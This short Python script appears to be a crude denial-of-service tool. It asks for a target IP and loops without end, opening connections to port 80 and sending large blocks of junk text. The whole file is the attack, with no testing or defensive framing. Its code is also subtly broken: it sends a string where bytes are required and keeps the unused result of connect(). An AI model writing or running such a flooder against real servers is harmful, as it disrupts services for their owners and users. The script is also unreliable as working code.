import os
import socket
os.system("clear")
print ("type ip")
ip = input ()
while True:
    sock = socket.socket (socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    conn = sock.connect((ip,80))
    data = ("yayayauauauygryhuiyyyujihh"*10000)
    sock.send(data)
    print ("working at",ip)
